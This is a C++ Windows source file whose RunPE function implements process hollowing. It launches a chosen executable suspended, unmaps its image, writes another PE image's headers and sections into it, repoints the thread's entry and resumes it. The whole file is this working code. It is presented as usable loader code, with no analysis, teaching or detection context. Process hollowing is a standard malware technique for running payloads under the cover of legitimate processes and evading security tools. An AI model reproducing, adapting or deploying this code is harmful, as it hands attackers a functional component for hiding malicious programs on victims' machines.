#include <Windows.h>
 
typedef LONG (WINAPI * NtUnmapViewOfSection)(HANDLE ProcessHandle, PVOID BaseAddress); 

/* Copies PE-image from given offset to memory */
LPVOID ShellcodeToMem(LPBYTE pCode, DWORD dwSize)
{
    LPVOID pBuffer = VirtualAlloc(NULL, dwSize, MEM_COMMIT, PAGE_READWRITE);
	CopyMemory(pBuffer, pCode, dwSize);

    return pBuffer;
}
 
 /* Run PE-image in memory (process hollowing method) */
void RunPE(LPSTR szFilePath, LPVOID pFile)
{
    PIMAGE_DOS_HEADER DosHeader;
    PIMAGE_NT_HEADERS NtHeader;
    PIMAGE_SECTION_HEADER Section;
    PROCESS_INFORMATION pi;
    STARTUPINFOA si;
    PCONTEXT ctx;
    PDWORD dwImageBase;
    NtUnmapViewOfSection xNtUnmapViewOfSection;
    LPVOID pImageBase;
    int Count;
 
    DosHeader = PIMAGE_DOS_HEADER(pFile);
    if (DosHeader->e_magic == IMAGE_DOS_SIGNATURE)
    {
        NtHeader = PIMAGE_NT_HEADERS(DWORD(pFile) + DosHeader->e_lfanew);
        if (NtHeader->Signature == IMAGE_NT_SIGNATURE)
        {
            RtlZeroMemory(&si, sizeof(si));
            RtlZeroMemory(&pi, sizeof(pi));
 
            if (CreateProcessA(szFilePath, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi))
            {
                ctx = (PCONTEXT)VirtualAlloc(NULL, sizeof(ctx), MEM_COMMIT, PAGE_READWRITE);
                ctx->ContextFlags = CONTEXT_FULL;
                if (GetThreadContext(pi.hThread, (LPCONTEXT)ctx))
                {
                    ReadProcessMemory(pi.hProcess, LPCVOID(ctx->Ebx + 8), LPVOID(&dwImageBase), 4, NULL);
 
                    if (DWORD(dwImageBase) == NtHeader->OptionalHeader.ImageBase)
                    {
                        xNtUnmapViewOfSection = NtUnmapViewOfSection(GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtUnmapViewOfSection"));
                        xNtUnmapViewOfSection(pi.hProcess, PVOID(dwImageBase));
                    }
 
                    pImageBase = VirtualAllocEx(pi.hProcess, LPVOID(NtHeader->OptionalHeader.ImageBase), NtHeader->OptionalHeader.SizeOfImage, 0x3000, PAGE_EXECUTE_READWRITE);
                    if (pImageBase)
                    {
                        WriteProcessMemory(pi.hProcess, pImageBase, pFile, NtHeader->OptionalHeader.SizeOfHeaders, NULL);
                        for (Count = 0; Count < NtHeader->FileHeader.NumberOfSections; Count++)
                        {
                            Section = PIMAGE_SECTION_HEADER(DWORD(pFile) + DosHeader->e_lfanew + 248 + (Count * 40));
                            WriteProcessMemory(pi.hProcess, LPVOID(DWORD(pImageBase) + Section->VirtualAddress), LPVOID(DWORD(pFile) + Section->PointerToRawData), Section->SizeOfRawData, NULL);   
                        }
                        WriteProcessMemory(pi.hProcess, LPVOID(ctx->Ebx + 8), LPVOID(&NtHeader->OptionalHeader.ImageBase), 4, NULL);
                        ctx->Eax = DWORD(pImageBase) + NtHeader->OptionalHeader.AddressOfEntryPoint;
                        SetThreadContext(pi.hThread, LPCONTEXT(ctx));
                        ResumeThread(pi.hThread);
                    }
                }
            }
        }
    }
    VirtualFree(pFile, 0, MEM_RELEASE);
}